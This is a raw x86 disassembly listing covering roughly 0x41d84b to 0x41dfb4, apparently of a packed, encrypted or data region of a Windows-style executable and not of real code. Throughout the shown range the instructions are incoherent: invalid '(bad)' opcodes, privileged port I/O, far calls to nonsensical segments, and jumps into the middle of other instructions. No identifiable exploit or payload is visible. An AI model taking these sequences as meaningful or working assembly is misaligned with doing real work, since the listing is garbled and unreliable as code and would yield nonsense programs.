  41d84b:	ja     0x41d89a
  41d84d:	clc    
  41d84e:	or     ch,BYTE PTR [esi-0x7c]
  41d851:	inc    edi
  41d852:	lock dec ecx
  41d854:	pusha  
  41d855:	in     eax,0x52
  41d857:	xor    al,dh
  41d859:	inc    ecx
  41d85a:	and    dh,ch
  41d85c:	pusha  
  41d85d:	outs   dx,DWORD PTR ds:[esi]
  41d85e:	loope  0x41d84a
  41d860:	(bad)  ds:[edi]
  41d863:	jecxz  0x41d849
  41d865:	xor    al,al
  41d867:	pop    ss
  41d868:	mov    ?,WORD PTR ds:0xf6689f2d
  41d86e:	jbe    0x41d81f
  41d870:	pop    eax
  41d871:	sbb    BYTE PTR [edi],bl
  41d873:	hlt    
  41d874:	retf   0x6811
  41d877:	je     0x41d85b
  41d879:	inc    edx
  41d87a:	sbb    eax,0xf0239aba
  41d87f:	daa    
  41d880:	push   ss
  41d881:	xchg   esi,eax
  41d882:	cmp    eax,0xc4201b09
  41d887:	jecxz  0x41d894
  41d889:	inc    ecx
  41d88a:	(bad)  
  41d88b:	out    dx,eax
  41d88c:	mov    ah,0xf
  41d88e:	mov    cl,0x6e
  41d890:	push   ds
  41d891:	cdq    
  41d892:	and    edx,esp
  41d894:	inc    ebp
  41d895:	outs   dx,DWORD PTR ds:[esi]
  41d896:	push   ecx
  41d897:	jg     0x41d88d
  41d899:	add    DWORD PTR [edi],eax
  41d89b:	sub    DWORD PTR [ebp-0x43],edx
  41d89e:	out    dx,eax
  41d89f:	enter  0x7bf,0x19
  41d8a3:	add    al,0x69
  41d8a5:	call   0xaf5d:0x85e18825
  41d8ac:	or     edx,DWORD PTR [ecx-0x15]
  41d8af:	sbb    ch,BYTE PTR [esi]
  41d8b1:	xor    DWORD PTR [ebp+0x7b],esi
  41d8b4:	test   BYTE PTR [ebx-0x645af149],dl
  41d8ba:	jnp    0x41d89a
  41d8bc:	adc    ch,ch
  41d8be:	call   0xf7f8:0x89572c72
  41d8c5:	push   esi
  41d8c6:	xor    edx,DWORD PTR [edx+0x17a8bda9]
  41d8cc:	stos   DWORD PTR es:[edi],eax
  41d8cd:	mov    ecx,0x80c9650c
  41d8d2:	add    DWORD PTR [eax],edi
  41d8d4:	sub    edi,DWORD PTR [edx]
  41d8d6:	cmp    DWORD PTR [esi-0x539f4e25],esp
  41d8dc:	push   ecx
  41d8dd:	push   ecx
  41d8de:	jle    0x41d8ca
  41d8e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8e1:	mov    dl,0xa7
  41d8e3:	(bad)  
  41d8e5:	sub    ah,BYTE PTR [ecx-0x5d]
  41d8e8:	rcr    DWORD PTR [edi+ebp*8-0x578fcf9],1
  41d8ef:	mov    edx,0x801a4d81
  41d8f4:	data16 repnz arpl WORD PTR [esi-0x56c16277],bx
  41d8fc:	mov    eax,0x80811059
  41d901:	jnp    0x41d92b
  41d903:	test   BYTE PTR [ebp-0x139eef66],dh
  41d909:	jl     0x41d8be
  41d90b:	dec    ecx
  41d90c:	adc    BYTE PTR [edi],0x96
  41d90f:	ret    0xd1d8
  41d912:	pop    ebx
  41d913:	in     al,dx
  41d914:	rcl    bh,0xf9
  41d917:	fdivr  DWORD PTR [edx+edi*2]
  41d91a:	adc    BYTE PTR [ebp+0x73],dh
  41d91d:	mov    bl,0xd2
  41d91f:	shl    DWORD PTR [ebx],cl
  41d921:	mov    ds:0xbda75cf7,eax
  41d926:	out    0xde,eax
  41d928:	js     0x41d969
  41d92a:	xchg   BYTE PTR [edx+0x7ed4735e],cl
  41d930:	and    ch,bl
  41d932:	ins    BYTE PTR es:[edi],dx
  41d933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d934:	jo     0x41d968
  41d936:	sar    DWORD PTR [edx+0x36],0x2
  41d93a:	idiv   BYTE PTR [esi-0x40]
  41d93d:	out    dx,eax
  41d93e:	cmp    BYTE PTR [edi],0x86
  41d941:	loop   0x41d8cb
  41d943:	cmp    BYTE PTR [ebx-0x9],dl
  41d946:	sbb    BYTE PTR [di+0x27],0x58
  41d94b:	sbb    DWORD PTR [esi+0x45],esp
  41d94e:	not    cl
  41d950:	adc    eax,0x693d7a5b
  41d955:	jno    0x41d961
  41d957:	pop    ds
  41d958:	call   0x9da3:0x92644cfa
  41d95f:	retf   
  41d960:	cmc    
  41d961:	add    BYTE PTR [ebx-0x6845811c],ch
  41d967:	pop    eax
  41d968:	pusha  
  41d969:	inc    edi
  41d96a:	adc    DWORD PTR [ecx-0x6e],eax
  41d96d:	push   edx
  41d96e:	popf   
  41d96f:	push   0x3c
  41d971:	push   ebx
  41d972:	dec    ebp
  41d973:	jnp    0x41d979
  41d975:	cmp    al,0xd6
  41d977:	cs gs push cs
  41d97a:	loopne 0x41d928
  41d97c:	xchg   DWORD PTR [edi-0x7],edx
  41d97f:	sub    BYTE PTR [ecx+0x7b],0x6
  41d983:	cmp    ebx,DWORD PTR [ebp-0x8]
  41d986:	out    0xf7,eax
  41d988:	gs dec eax
  41d98a:	ret    
  41d98b:	xchg   ebp,eax
  41d98c:	pop    es
  41d98d:	bound  ecx,QWORD PTR [ecx]
  41d98f:	test   DWORD PTR [ebx-0x36589527],ebp
  41d995:	dec    eax
  41d996:	push   ds
  41d997:	inc    edx
  41d998:	fcom   QWORD PTR [ecx-0x6870fb30]
  41d99e:	push   ebx
  41d99f:	(bad)  
  41d9a0:	xchg   ebx,eax
  41d9a1:	aaa    
  41d9a2:	aas    
  41d9a3:	jmp    FWORD PTR [ebx-0x610905d3]
  41d9a9:	mov    dl,0xe3
  41d9ab:	les    eax,FWORD PTR [edi-0x52]
  41d9ae:	mov    ch,BYTE PTR [ebx+0xa10c9dd]
  41d9b4:	ds das 
  41d9b6:	sub    al,0xb4
  41d9b8:	add    ebp,ebx
  41d9ba:	call   0xc832:0x52daed2e
  41d9c1:	leave  
  41d9c2:	loope  0x41da1b
  41d9c4:	sbb    ebp,ecx
  41d9c6:	mov    dh,BYTE PTR [ecx]
  41d9c8:	dec    ebx
  41d9c9:	lds    eax,FWORD PTR [eax]
  41d9cb:	xchg   edi,eax
  41d9cc:	pop    ds
  41d9cd:	xlat   BYTE PTR ds:[ebx]
  41d9ce:	out    0xff,eax
  41d9d0:	outs   dx,DWORD PTR ds:[esi]
  41d9d1:	inc    sp
  41d9d3:	dec    ebx
  41d9d4:	push   cs
  41d9d5:	ins    BYTE PTR es:[edi],dx
  41d9d6:	sti    
  41d9d7:	sti    
  41d9d8:	mov    bl,0x25
  41d9da:	sbb    DWORD PTR [ebx],eax
  41d9dc:	lock cs jmp 0xc601:0x84ef709f
  41d9e5:	mov    ds:0x9aae4ed6,al
  41d9ea:	mov    dh,0x85
  41d9ec:	into   
  41d9ed:	mov    dh,0x30
  41d9ef:	rcr    BYTE PTR [ebx],1
  41d9f1:	dec    edx
  41d9f2:	push   esi
  41d9f3:	into   
  41d9f4:	clc    
  41d9f5:	out    dx,al
  41d9f6:	inc    ecx
  41d9f7:	in     al,dx
  41d9f8:	dec    esp
  41d9f9:	imul   edx,DWORD PTR [esi+0x25def5fb],0x53
  41da00:	retf   
  41da01:	nop
  41da02:	rcr    BYTE PTR [ebx+0x7423a217],cl
  41da08:	or     eax,0xc292f2f7
  41da0d:	int    0xaa
  41da0f:	sahf   
  41da10:	mov    eax,0xef764995
  41da15:	out    dx,eax
  41da16:	cld    
  41da17:	les    eax,FWORD PTR [ebx+0x36a570e1]
  41da1d:	sbb    eax,0x84605f34
  41da22:	add    dl,dh
  41da24:	sbb    BYTE PTR [ebp-0x20],dl
  41da27:	adc    cl,BYTE PTR [ecx+0x2a]
  41da2a:	(bad)  
  41da2c:	pop    eax
  41da2d:	pop    esp
  41da2e:	jbe    0x41da56
  41da30:	xchg   edx,eax
  41da31:	jl     0x41d9b4
  41da33:	mov    cs,WORD PTR [eax]
  41da35:	mov    dl,0xff
  41da37:	adc    eax,0xe720022b
  41da3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da3d:	shr    DWORD PTR [edx],cl
  41da3f:	ja     0x41da71
  41da41:	inc    esi
  41da42:	ins    BYTE PTR es:[edi],dx
  41da43:	es mov dh,0x94
  41da46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da47:	jno    0x41d9d8
  41da49:	hlt    
  41da4a:	pop    edx
  41da4b:	mov    ch,0xc3
  41da4d:	or     eax,0x49ed0570
  41da52:	pop    esp
  41da53:	mov    ebx,DWORD PTR [ebx]
  41da55:	pushf  
  41da56:	and    bl,dh
  41da58:	mul    BYTE PTR [ebp+eiz*2-0x30]
  41da5c:	outs   dx,BYTE PTR ds:[si]
  41da5e:	sub    DWORD PTR [eax-0x71],edx
  41da61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da62:	pop    edx
  41da63:	stos   BYTE PTR es:[edi],al
  41da64:	ds or  al,0x18
  41da67:	or     eax,0xc113b948
  41da6c:	fidivr WORD PTR [ebx-0x5]
  41da6f:	mov    ebx,DWORD PTR [ebp-0x7d]
  41da72:	push   edx
  41da73:	mov    eax,DWORD PTR [ebp-0x73]
  41da76:	cmp    BYTE PTR [esi+0x360d2a19],0x54
  41da7d:	retf   0xb559
  41da80:	or     ebp,eax
  41da82:	pop    ecx
  41da83:	jecxz  0x41da4d
  41da85:	or     ch,ch
  41da87:	loopne 0x41da17
  41da89:	(bad)  [esi]
  41da8b:	arpl   WORD PTR [eax+esi*1],si
  41da8e:	aas    
  41da8f:	jbe    0x41da6e
  41da91:	shl    DWORD PTR [ecx-0xf],1
  41da94:	mov    ds:0x5c1b809f,eax
  41da99:	sbb    al,0x8c
  41da9b:	jns    0x41daa8
  41da9d:	sub    al,0xc2
  41da9f:	stc    
  41daa0:	jnp    0x41da81
  41daa2:	mov    dl,0x8b
  41daa4:	sbb    esp,DWORD PTR [ebx]
  41daa6:	in     eax,dx
  41daa7:	push   ecx
  41daa8:	and    eax,0xff3f499
  41daad:	dec    ebx
  41daae:	xor    DWORD PTR fs:[ecx-0x7ca498e0],0xc5f275a2
  41dab9:	add    eax,0xe3c90d6e
  41dabe:	in     eax,dx
  41dabf:	mov    esi,0xb3615a9f
  41dac4:	in     eax,dx
  41dac5:	rol    DWORD PTR [ecx],0x75
  41dac8:	bnd jnp 0x41dab6
  41dacb:	test   eax,0xa801957
  41dad0:	std    
  41dad1:	mov    bh,0x74
  41dad3:	imul   ebp,edx,0x70951a52
  41dad9:	cmp    eax,0xbf4dfbf9
  41dade:	fidivr WORD PTR [edi+0x6a]
  41dae1:	jne    0x41da87
  41dae3:	and    ebp,0x14ca70a8
  41dae9:	cmp    eax,0x389b0c7c
  41daee:	js     0x41da99
  41daf0:	pop    ds
  41daf1:	sub    edi,edx
  41daf3:	repnz xor ecx,DWORD PTR [eax+eiz*2+0x208aeff5]
  41dafb:	ds jecxz 0x41dac6
  41dafe:	mov    bh,0xb5
  41db00:	mov    ds:0xa9198e8,al
  41db05:	adc    BYTE PTR [ebp+0x76],0x90
  41db09:	fiadd  WORD PTR [edi+0x5a]
  41db0c:	es mov esp,ecx
  41db0f:	ins    DWORD PTR es:[edi],dx
  41db10:	lds    eax,FWORD PTR [edx-0x7659b921]
  41db16:	lock mov ebp,0x2c3ce5cd
  41db1c:	call   0x6f97:0xdc8b7e49
  41db23:	call   0xa173:0x4868dcc
  41db2a:	inc    ebp
  41db2b:	push   ebx
  41db2c:	fild   DWORD PTR [ecx]
  41db2e:	sbb    edx,ecx
  41db30:	ret    0xece
  41db33:	xchg   ebx,eax
  41db34:	popa   
  41db35:	xchg   edi,edi
  41db37:	iret   
  41db38:	sbb    ch,BYTE PTR [esi]
  41db3a:	test   eax,0x8ad515c9
  41db3f:	inc    ecx
  41db40:	int3   
  41db41:	pop    ss
  41db42:	not    DWORD PTR [ebx]
  41db44:	push   ds
  41db45:	sbb    BYTE PTR [edx+0x7b],0xe3
  41db49:	xor    DWORD PTR [edx-0x32],eax
  41db4c:	pop    ecx
  41db4d:	cmc    
  41db4e:	adc    DWORD PTR [eax-0x23],edi
  41db51:	dec    ebp
  41db52:	cdq    
  41db53:	lock rcr BYTE PTR [edi-0x55ff0467],1
  41db5a:	mov    WORD PTR [esi-0x1e],?
  41db5d:	lds    edx,FWORD PTR [ebp+0x62c95995]
  41db63:	(bad)  
  41db64:	lea    ebp,[esi+0x10]
  41db67:	out    0x99,al
  41db69:	cmp    eax,0x9da9c0c9
  41db6e:	adc    DWORD PTR [eax+0x1bb62d8d],eax
  41db74:	mov    bh,0x20
  41db76:	out    dx,eax
  41db77:	addr16 sub eax,0xdd722a5f
  41db7d:	aam    0x67
  41db7f:	mov    ds:0x5ebfb104,eax
  41db84:	or     eax,DWORD PTR [ecx-0x5c1376dc]
  41db8a:	lds    ebx,FWORD PTR [esp+esi*1]
  41db8d:	icebp  
  41db8e:	(bad)  
  41db8f:	mov    dh,0xd7
  41db91:	dec    eax
  41db92:	push   ds
  41db93:	sub    ch,bh
  41db95:	jl     0x41db51
  41db97:	xor    BYTE PTR [esi+0x77],dh
  41db9a:	sub    BYTE PTR [edx],ch
  41db9c:	jne    0x41db65
  41db9e:	aas    
  41db9f:	jmp    0x159e:0x9aed40b6
  41dba6:	adc    BYTE PTR [edi+0x4],bl
  41dba9:	pop    ecx
  41dbaa:	test   BYTE PTR [ebx-0xf],0xe2
  41dbae:	mov    bh,0xce
  41dbb0:	lods   al,BYTE PTR ds:[esi]
  41dbb1:	inc    ecx
  41dbb2:	adc    eax,0x11bbe810
  41dbb7:	or     eax,0x1301cd52
  41dbbc:	and    eax,0xa27c3ee3
  41dbc1:	jno    0x41db62
  41dbc3:	test   DWORD PTR [edx+0x4c032f90],edi
  41dbc9:	dec    ebx
  41dbca:	or     al,0x83
  41dbcc:	rcr    DWORD PTR [esi],cl
  41dbce:	xor    al,0xdb
  41dbd0:	pop    esp
  41dbd1:	push   cs
  41dbd2:	test   esp,esp
  41dbd4:	js     0x41dbca
  41dbd6:	mov    BYTE PTR [esi+0x8df4],0x6a
  41dbdd:	dec    eax
  41dbde:	push   0xffffffcd
  41dbe0:	mov    ch,0x14
  41dbe2:	(bad)  
  41dbe3:	or     BYTE PTR [esi+ebp*2-0xb],bl
  41dbe7:	lds    edi,FWORD PTR [edi]
  41dbe9:	popf   
  41dbea:	fisubr DWORD PTR [ecx]
  41dbec:	sbb    al,0xd3
  41dbee:	xor    eax,0xb8770e3d
  41dbf3:	mov    eax,0x51b1e8cf
  41dbf8:	dec    esi
  41dbf9:	cmp    DWORD PTR [ebp+0x584c1566],ecx
  41dbff:	rcl    BYTE PTR [ecx+esi*2+0x17645c16],cl
  41dc06:	cdq    
  41dc07:	jbe    0x41db9c
  41dc09:	pop    eax
  41dc0a:	call   0x956d:0xfa905dfd
  41dc11:	call   0xaf31:0xbbfa5daf
  41dc18:	jecxz  0x41dc24
  41dc1a:	add    eax,ebp
  41dc1c:	mov    al,0xd0
  41dc1e:	cmp    al,0xc6
  41dc20:	dec    ebp
  41dc21:	sub    ah,cl
  41dc23:	push   ebx
  41dc24:	aam    0x50
  41dc26:	inc    edi
  41dc27:	enter  0xae5d,0xe0
  41dc2b:	not    DWORD PTR [eax+0x27a2c09f]
  41dc31:	(bad)  
  41dc32:	shl    ebx,cl
  41dc34:	leave  
  41dc35:	fidiv  DWORD PTR [edx+0x5b9a7073]
  41dc3b:	xor    eax,0x7e5ec2be
  41dc40:	adc    ecx,DWORD PTR [esi+edx*8-0x37]
  41dc44:	jmp    0x41dbf8
  41dc46:	mov    ah,0x5
  41dc48:	mov    cl,dl
  41dc4a:	mov    ?,WORD PTR [edi-0x695e0022]
  41dc50:	test   al,0x65
  41dc52:	mov    ss,ecx
  41dc54:	dec    edx
  41dc55:	mov    esi,0xc2eac678
  41dc5a:	jne    0x41dcc6
  41dc5c:	jp     0x41dbf6
  41dc5e:	jo     0x41dc2f
  41dc60:	and    bl,ah
  41dc62:	inc    ebp
  41dc63:	mov    esi,0xad3eb44b
  41dc68:	(bad)  
  41dc69:	iret   
  41dc6a:	rol    BYTE PTR [eax+eax*2-0x27cb4207],0x50
  41dc72:	push   eax
  41dc73:	push   edx
  41dc74:	daa    
  41dc75:	sbb    eax,0xb22d8b8f
  41dc7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc7b:	popa   
  41dc7c:	and    al,0xf8
  41dc7e:	out    dx,al
  41dc7f:	mov    ebp,0xf0aa49a6
  41dc84:	clc    
  41dc85:	mov    bh,0x4a
  41dc87:	pushf  
  41dc88:	xchg   edx,eax
  41dc89:	xor    eax,DWORD PTR [ecx+0x2def7d95]
  41dc8f:	push   edi
  41dc90:	or     esi,esp
  41dc92:	scas   eax,DWORD PTR es:[edi]
  41dc93:	js     0x41dd06
  41dc95:	fld    DWORD PTR [eax+edx*8+0x32]
  41dc99:	test   bl,cl
  41dc9b:	dec    esi
  41dc9c:	retf   0x774a
  41dc9f:	mov    ds:0x3206e3c9,al
  41dca4:	popa   
  41dca5:	imul   ebx,ebx,0xffffffa9
  41dca8:	cmp    al,0x94
  41dcaa:	outs   dx,DWORD PTR ds:[esi]
  41dcab:	cmp    dl,BYTE PTR [esi+0x4c]
  41dcae:	pop    ecx
  41dcaf:	fst    DWORD PTR [ebx+0x5b]
  41dcb2:	cmp    esp,DWORD PTR [edi-0x61]
  41dcb5:	ret    
  41dcb6:	cld    
  41dcb7:	ret    0xa788
  41dcba:	dec    esp
  41dcbb:	fsubrp st(7),st
  41dcbd:	jne    0x41dc7d
  41dcbf:	sbb    ebx,DWORD PTR [edi+0x11]
  41dcc2:	retf   
  41dcc3:	outs   dx,DWORD PTR ds:[esi]
  41dcc4:	push   0xffffff8c
  41dcc6:	push   eax
  41dcc7:	mov    ds:0x2e72d68a,al
  41dccc:	call   0x573f52f
  41dcd1:	adc    dl,BYTE PTR [ebx]
  41dcd3:	leave  
  41dcd4:	clc    
  41dcd5:	bound  edx,QWORD PTR [eax-0x51328a81]
  41dcdb:	push   0xffffff89
  41dcdd:	push   0x263accca
  41dce2:	hlt    
  41dce3:	leave  
  41dce4:	daa    
  41dce5:	push   ecx
  41dce6:	pop    eax
  41dce7:	pop    ds
  41dce8:	call   0x8bac:0x43f150bc
  41dcef:	adc    esp,esi
  41dcf1:	stos   DWORD PTR es:[edi],eax
  41dcf2:	dec    ebp
  41dcf3:	and    DWORD PTR [esi-0x3d],edi
  41dcf6:	pop    eax
  41dcf7:	fnstenv [ebp+0x92112c7]
  41dcfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcfe:	push   edi
  41dcff:	fadd   st,st(6)
  41dd01:	das    
  41dd02:	push   0xe4932e7b
  41dd07:	xchg   BYTE PTR [ebx+0x8],cl
  41dd0a:	jne    0x41dc98
  41dd0c:	lods   al,BYTE PTR ds:[esi]
  41dd0d:	icebp  
  41dd0e:	cli    
  41dd0f:	frstor [eax]
  41dd11:	xchg   ebp,eax
  41dd12:	ret    
  41dd13:	ret    
  41dd14:	cmp    DWORD PTR [ecx-0x1e],0xfeb20b4
  41dd1b:	mov    esi,DWORD PTR [ebx+0x68]
  41dd1e:	pop    ecx
  41dd1f:	stc    
  41dd20:	repz mov dl,0x55
  41dd23:	ins    DWORD PTR es:[edi],dx
  41dd24:	jp     0x41dd0c
  41dd26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd27:	sub    edx,DWORD PTR [ecx+0x40]
  41dd2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd2b:	adc    ecx,DWORD PTR [edx]
  41dd2d:	xchg   ebp,eax
  41dd2e:	call   0x3266e489
  41dd33:	es aaa 
  41dd35:	and    eax,0xa44a5c10
  41dd3a:	int    0x94
  41dd3c:	cmp    ebp,DWORD PTR [edx-0x61]
  41dd3f:	jb     0x41ddaf
  41dd41:	(bad)  
  41dd42:	std    
  41dd43:	adc    ah,BYTE PTR [edx+0x12]
  41dd46:	out    dx,eax
  41dd47:	jmp    0x949d:0x349338a7
  41dd4e:	lahf   
  41dd4f:	or     DWORD PTR [edi],ebp
  41dd51:	and    cl,ah
  41dd53:	inc    edx
  41dd54:	mov    DWORD PTR [esi-0x52],ecx
  41dd57:	mov    eax,0x62d62df2
  41dd5c:	and    DWORD PTR [eax-0x5f7f51b5],ecx
  41dd62:	sub    eax,0x5548b9b7
  41dd67:	test   BYTE PTR [ecx+edi*4-0x322d85c4],0xcc
  41dd6f:	dec    esp
  41dd70:	mov    esp,0x833d23ba
  41dd75:	fld    DWORD PTR [ecx+0x14]
  41dd78:	inc    edi
  41dd79:	jb     0x41dd97
  41dd7b:	in     al,dx
  41dd7c:	test   BYTE PTR [eax+0x32],0xbb
  41dd80:	pop    esi
  41dd81:	nop
  41dd82:	cmp    al,0x2
  41dd84:	xor    al,0x21
  41dd86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd87:	aaa    
  41dd88:	jle    0x41ddbd
  41dd8a:	test   dl,ch
  41dd8c:	iret   
  41dd8d:	ss push ecx
  41dd8f:	mov    DWORD PTR [ebx],0xbf2fb9
  41dd95:	es inc eax
  41dd97:	and    edi,DWORD PTR [esi-0x73]
  41dd9a:	cmp    al,BYTE PTR [ebx-0x2d]
  41dd9d:	ficomp DWORD PTR [edx]
  41dd9f:	pop    es
  41dda0:	push   0xffffff92
  41dda2:	inc    edx
  41dda3:	cmp    dh,0x30
  41dda6:	fstp   QWORD PTR [eax]
  41dda8:	jbe    0x41dd68
  41ddaa:	mov    bh,0x32
  41ddac:	(bad)  
  41ddad:	mov    ebx,0x96a850ae
  41ddb2:	sti    
  41ddb3:	xchg   ecx,eax
  41ddb4:	mov    edi,0xf2707077
  41ddb9:	sub    BYTE PTR [edx+eax*2+0x27],dh
  41ddbd:	das    
  41ddbe:	xchg   ebp,eax
  41ddbf:	ins    DWORD PTR es:[edi],dx
  41ddc0:	dec    ebx
  41ddc1:	mov    edi,0x96cb4b16
  41ddc6:	mov    edi,0x3a9c0ab3
  41ddcb:	sbb    cl,0xf5
  41ddce:	(bad)  
  41ddcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddd1:	cmp    al,0x52
  41ddd3:	xchg   edx,eax
  41ddd4:	mov    dl,0x45
  41ddd6:	mov    cl,0x2c
  41ddd8:	js     0x41dde4
  41ddda:	sub    al,0x8b
  41dddc:	push   ss
  41dddd:	test   DWORD PTR [esi-0x20],ebx
  41dde0:	jmp    0x41ddff
  41dde2:	sbb    DWORD PTR [ebx+0x3d],edx
  41dde5:	mov    dl,0x25
  41dde7:	or     BYTE PTR [eax],ah
  41dde9:	pop    esp
  41ddea:	xor    eax,0xe29a35d7
  41ddef:	out    dx,eax
  41ddf0:	loopne 0x41ddcc
  41ddf2:	push   ds
  41ddf3:	push   edx
  41ddf4:	inc    eax
  41ddf5:	rol    DWORD PTR ss:[edi+0xdcfe786],cl
  41ddfc:	aam    0xca
  41ddfe:	sbb    BYTE PTR [edx+0x54],0x33
  41de02:	sbb    DWORD PTR [edi+0x17],0xffffffc9
  41de06:	pop    edi
  41de07:	clc    
  41de08:	xchg   DWORD PTR cs:[edi+eiz*8],ebp
  41de0c:	retf   
  41de0d:	pop    ds
  41de0e:	push   edi
  41de0f:	jmp    0x41de41
  41de11:	(bad)
  41de15:	mov    cl,0xc4
  41de17:	pusha  
  41de18:	push   ss
  41de19:	aas    
  41de1a:	lods   al,BYTE PTR cs:[esi]
  41de1c:	xchg   ebx,eax
  41de1d:	sub    edx,DWORD PTR [ebx]
  41de1f:	and    DWORD PTR [edx-0x1f1ac969],eax
  41de25:	lock jno 0x41de0b
  41de28:	iret   
  41de29:	dec    eax
  41de2a:	bound  ebx,QWORD PTR [ebp-0x41]
  41de2d:	adc    BYTE PTR [eax],dh
  41de2f:	push   ss
  41de30:	ins    DWORD PTR es:[edi],dx
  41de31:	xchg   ebp,eax
  41de32:	add    al,0x97
  41de34:	xchg   ebp,eax
  41de35:	mov    ds:0x5d3f2764,eax
  41de3a:	aaa    
  41de3b:	ret    0x2e48
  41de3e:	(bad)  
  41de3f:	pop    ecx
  41de40:	lds    esi,FWORD PTR [esi+0x6]
  41de43:	adc    eax,DWORD PTR [ebx-0x4c1426ec]
  41de49:	bound  ebx,QWORD PTR ds:0xb25d1dea
  41de4f:	aas    
  41de50:	push   ds
  41de51:	push   edi
  41de52:	xor    DWORD PTR [ebp+0x71560007],ecx
  41de58:	sbb    cl,cl
  41de5a:	sbb    eax,0x74684906
  41de5f:	out    dx,al
  41de60:	dec    edx
  41de61:	sub    BYTE PTR [edi],0xca
  41de64:	imul   ebp,DWORD PTR [eax+0x7aff60b6],0x6b
  41de6b:	or     BYTE PTR [edi+esi*2+0x60],dh
  41de6f:	mov    bl,0x39
  41de71:	jne    0x41ded7
  41de73:	daa    
  41de74:	add    ebx,DWORD PTR [ecx+0x2c]
  41de77:	aaa    
  41de78:	mov    ah,BYTE PTR [edx-0x20b8a838]
  41de7e:	mov    esi,0xde56f295
  41de83:	pop    eax
  41de84:	mov    ch,0x75
  41de86:	dec    ah
  41de88:	in     eax,0x5a
  41de8a:	xchg   edi,eax
  41de8b:	xor    DWORD PTR [ecx+esi*1-0x504d395c],ebp
  41de92:	jl     0x41dee4
  41de94:	inc    edx
  41de95:	xor    eax,0xdf306e6
  41de9a:	inc    edx
  41de9b:	sahf   
  41de9c:	xor    BYTE PTR [edi],dl
  41de9e:	add    eax,DWORD PTR [esi-0x11c40722]
  41dea4:	ror    BYTE PTR [edi-0x74],cl
  41dea7:	jmp    0xcc505f23
  41deac:	jae    0x41deb7
  41deae:	xchg   ch,dh
  41deb0:	or     eax,0x8ee68009
  41deb5:	stos   DWORD PTR es:[edi],eax
  41deb6:	dec    eax
  41deb7:	icebp  
  41deb8:	sbb    ebx,DWORD PTR [eax]
  41deba:	ret    0x2b37
  41debd:	cmp    eax,0xb420669c
  41dec2:	add    DWORD PTR [eax],esp
  41dec4:	lock int3 
  41dec6:	shl    DWORD PTR [edi],cl
  41dec8:	add    bl,BYTE PTR [edx-0x208424b4]
  41dece:	mov    eax,ds:0x6a2692e0
  41ded3:	idiv   BYTE PTR [ebp-0x4e]
  41ded6:	popa   
  41ded7:	dec    ebp
  41ded8:	jnp    0x41df51
  41deda:	jae    0x41de68
  41dedc:	int    0xb4
  41dede:	push   edi
  41dedf:	arpl   WORD PTR [edx+0x23],si
  41dee2:	gs sbb ebx,ebx
  41dee5:	cmp    edx,ecx
  41dee7:	mov    WORD PTR [eax-0x44],gs
  41deea:	adc    eax,DWORD PTR [esi-0x49]
  41deed:	lahf   
  41deee:	sub    al,0xc8
  41def0:	adc    al,0xd4
  41def2:	xchg   ebp,eax
  41def3:	pop    esi
  41def4:	shr    ebp,1
  41def6:	inc    esp
  41def7:	outs   dx,DWORD PTR ds:[esi]
  41def8:	add    bl,BYTE PTR [ebp-0x4]
  41defb:	ret    0x64e8
  41defe:	ret    0x7e23
  41df01:	add    al,0x80
  41df03:	mov    BYTE PTR [edx-0x24],0x41
  41df07:	add    al,0x87
  41df09:	enter  0xf2e3,0xf9
  41df0d:	outs   dx,DWORD PTR ds:[esi]
  41df0e:	in     al,0xd0
  41df10:	mov    al,0xb5
  41df12:	mov    ds:0x6da0cbcd,eax
  41df17:	jle    0x41df4e
  41df19:	ret    
  41df1a:	or     BYTE PTR [edi-0x5d],ah
  41df1d:	sbb    BYTE PTR ds:0xe1fee15a,0xb
  41df24:	or     BYTE PTR [ecx],ah
  41df26:	xchg   esi,eax
  41df27:	xchg   edi,eax
  41df28:	and    al,0xd
  41df2a:	mov    ebx,0x52de6271
  41df2f:	add    cl,dl
  41df31:	xor    al,0x3b
  41df33:	jne    0x41dede
  41df35:	mov    dl,0x8c
  41df37:	(bad)  
  41df38:	pop    esi
  41df39:	pop    ss
  41df3a:	jnp    0x41dee4
  41df3c:	test   BYTE PTR [ebx],ah
  41df3e:	fsubr  DWORD PTR [ecx-0x23]
  41df41:	jno    0x41df40
  41df43:	outs   dx,BYTE PTR ds:[esi]
  41df44:	mov    dl,0xfc
  41df46:	adc    eax,0xe9ab0f72
  41df4b:	sub    DWORD PTR [ebx+0x0],ebx
  41df4e:	cwde   
  41df4f:	and    esi,DWORD PTR [ebx+0x77]
  41df52:	pusha  
  41df53:	dec    ebp
  41df54:	call   0xd4e1135f
  41df59:	icebp  
  41df5a:	push   ds
  41df5b:	inc    esi
  41df5c:	aad    0xaf
  41df5e:	pop    edi
  41df5f:	popf   
  41df60:	stc    
  41df61:	loope  0x41df71
  41df63:	mov    eax,0xc7bedf1c
  41df68:	mov    WORD PTR [eax+0x4ae1700a],cs
  41df6e:	repz pop edi
  41df70:	or     ebp,DWORD PTR [eax+0x258d8f0f]
  41df76:	ret    
  41df77:	xor    ecx,DWORD PTR [edx-0x2c4dc1b9]
  41df7d:	loopne 0x41dfd9
  41df7f:	xor    al,BYTE PTR [ecx-0x286d2f31]
  41df85:	test   BYTE PTR [esi-0x2652b487],cl
  41df8b:	scas   al,BYTE PTR es:[edi]
  41df8c:	fs xchg edi,eax
  41df8e:	dec    edi
  41df8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df90:	stos   DWORD PTR es:[edi],eax
  41df91:	pop    edx
  41df92:	in     eax,0xf8
  41df94:	xor    BYTE PTR [edi],dl
  41df96:	call   0xf0981781
  41df9b:	cmp    ch,BYTE PTR [ebx-0x459a1825]
  41dfa1:	mov    eax,0xa52dd718
  41dfa6:	mov    BYTE PTR [esp+edi*1],bl
  41dfa9:	or     bh,al
  41dfab:	and    al,0xb6
  41dfad:	xchg   edi,eax
  41dfae:	lahf   
  41dfaf:	mov    eax,ds:0x5de06a73
  41dfb4:	in     eax,0x8b
